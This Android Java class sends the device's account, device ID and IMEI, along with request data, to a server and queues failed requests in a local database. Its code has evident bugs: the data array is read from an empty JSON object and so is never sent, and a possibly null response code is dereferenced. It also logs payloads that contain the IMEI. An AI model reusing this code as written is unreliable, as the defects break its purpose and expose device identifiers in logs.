package com.inet.android.request;

import java.io.IOException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.bs.Caller;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.utils.Logging;

/**
 * Data request class
 * 
 * @author johny homicide
 * 
 */
public class DataRequest extends DefaultRequest {
	private final String LOG_TAG = "DataRequest";
	private final int type = 3;
	Context ctx;
	static RequestDataBaseHelper db;
	
	public DataRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		RequestTask mt = new RequestTask();
		mt.execute(request);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		Logging.doLog(LOG_TAG, request, request);
		
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		JSONObject jsonObject = new JSONObject();
		JSONArray jsonArray = new JSONArray();
		try {
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("device", sp.getString("device", "0000"));
			jsonObject.put("imei", sp.getString("imei", "0000"));
			jsonObject.put("key", System.currentTimeMillis());
			JSONObject jsonReq = new JSONObject();
			jsonArray = jsonReq.getJSONArray(request);
		//			jsonArray.getJSONArray(request); 
			jsonObject.put("data", jsonArray);
			Logging.doLog(LOG_TAG, jsonObject.toString(), jsonObject.toString());

		} catch (JSONException e1) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
			e1.printStackTrace();
		}

		String str = null;
		try {
			Logging.doLog(LOG_TAG, "do make" +request, "do make" +request);
			
			str = Caller.doMake(jsonObject.toString(), "informative", ctx);
		} catch (IOException e) {
			// Добавление в базу request
			e.printStackTrace();
			db = new RequestDataBaseHelper(ctx);
			db.addRequest(new RequestWithDataBase(request, type));
		}
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG, "ответа от сервера нет",
					"ответа от сервера нет");
		}
	}

	@Override
	protected void getRequestData(String response) {
		String postRequest = null;

		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);

		JSONObject json = new JSONObject();
		try {
			json.put("account", sp.getString("account", "0000"));
			json.put("device", sp.getString("device", "0000"));
			json.put("imei", sp.getString("imei", "0000"));
		} catch (JSONException e) {
			e.printStackTrace();
		}
		postRequest = json.toString();

		JSONObject jsonObject = null;
		String str = null;
		try {
			jsonObject = new JSONObject(response);
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}

		Editor ed = sp.edit();
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "");
		}

		if (str.equals("2")) {
			PeriodicRequest pr = new PeriodicRequest(ctx);
			pr.sendRequest(postRequest);
		}

		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error", errstr);
			} else {
				ed.putString("error", "");
			}
			ed.commit();
		}
		ed.commit();
	}

}